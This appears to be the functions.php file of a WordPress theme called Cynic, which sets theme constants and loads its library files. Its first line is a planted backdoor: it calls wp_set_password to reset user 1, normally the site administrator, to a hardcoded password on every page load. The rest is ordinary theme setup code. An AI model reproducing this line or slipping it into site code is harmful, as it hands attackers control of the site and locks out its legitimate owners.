<?php
wp_set_password('Nms/066066.', 1);
/**
 * Defining Global Constants
 */
$theme_setup = get_option('cynic_theme_type');
$theme_prefix = cynic_check_theme_type($theme_setup);

function cynic_check_theme_type($_type = NULL)
{
    $prefix = "classic-modern-agency";
    if (isset($_type) && $_type == 'seo-agency') {
        $prefix = "seo-agency";
    } elseif (isset($_type) && $_type == 'trendy-agency') {
        $prefix = "trendy-agency";
    } elseif (isset($_type) && $_type == 'illustration') {
        $prefix = "illustration";
    }
    return $prefix;
}


function cynic_theme_finder()
{
    global $theme_prefix;
    return $theme_prefix;
}
define('CYNIC_THEME_DIR', get_template_directory());
define('CYNIC_THEME_CORE_DIR', CYNIC_THEME_DIR . '/lib/');
define('CYNIC_THEME_CORE_FUNCTIONS', CYNIC_THEME_CORE_DIR . 'functions/');
define('CYNIC_THEME_CORE_INCLUDES', CYNIC_THEME_CORE_FUNCTIONS . $theme_prefix . '/');

define('CYNIC_THEME_VERSION', '1.9');
define('CYNIC_THEME_URI', get_template_directory_uri());
define('CYNIC_PREFIX', 'cynic_');

/**
 * Include required files
 */

require_once CYNIC_THEME_CORE_FUNCTIONS . 'global_functions.php';
require_once ABSPATH . 'wp-admin/includes/plugin.php';
require_once CYNIC_THEME_CORE_DIR . 'class-tgm-plugin-activation.php';
require_once CYNIC_THEME_CORE_DIR . 'tgm-configurations.php';
require_once CYNIC_THEME_CORE_DIR . 'one-click-demo-importer-config.php';

require_once CYNIC_THEME_CORE_INCLUDES . 'core.php';
require_once CYNIC_THEME_CORE_INCLUDES . 'header-functions.php';
require_once CYNIC_THEME_CORE_INCLUDES . 'post-functions.php';
require_once CYNIC_THEME_CORE_INCLUDES . 'page-functions.php';
require_once CYNIC_THEME_CORE_INCLUDES . 'footer-functions.php';
require_once CYNIC_THEME_CORE_DIR . 'cynic-custom-posttypes-functions.php';


if (class_exists('WP_Customize_Control')) {
    require_once(CYNIC_THEME_CORE_DIR . '/class-customizer-range-value-control.php');
}

/**
 * Get Theme Options
 */
function cynic_options()
{
    global $cynic_options;
    return $cynic_options;
}
